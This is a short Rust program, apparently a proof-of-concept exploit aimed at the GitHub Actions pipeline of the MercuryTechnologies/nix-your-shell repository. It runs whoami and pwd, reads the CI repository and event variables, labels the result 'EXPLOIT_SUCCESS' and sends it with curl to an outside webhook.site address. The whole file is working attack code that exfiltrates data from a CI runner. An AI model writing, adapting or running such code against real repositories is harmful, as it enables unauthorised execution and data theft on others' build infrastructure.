use std::process::Command;
use std::env;

fn main() {
    // Capture execution context
    let whoami = Command::new("whoami")
        .output()
        .expect("failed to execute whoami");
    
    let pwd = Command::new("pwd")
        .output()
        .expect("failed to execute pwd");
    
    // Get environment variables
    let repo = env::var("GITHUB_REPOSITORY").unwrap_or_default();
    let event = env::var("GITHUB_EVENT_NAME").unwrap_or_default();
    
    // Prepare data for webhook
    let data = format!(
        "EXPLOIT_SUCCESS:\nWHOAMI: {}\nPWD: {}\nREPO: {}\nEVENT: {}\nBASE_REPO_CONTEXT: MercuryTechnologies/nix-your-shell",
        String::from_utf8_lossy(&whoami.stdout),
        String::from_utf8_lossy(&pwd.stdout),
        repo,
        event
    );
    
    // Send to webhook wow
    let _ = Command::new("curl")
        .arg("-X")
        .arg("POST")
        .arg("https://webhook.site/YOUR-UNIQUE-ID")
        .arg("-H")
        .arg("Content-Type: text/plain")
        .arg("--data")
        .arg(&data)
        .output();
}
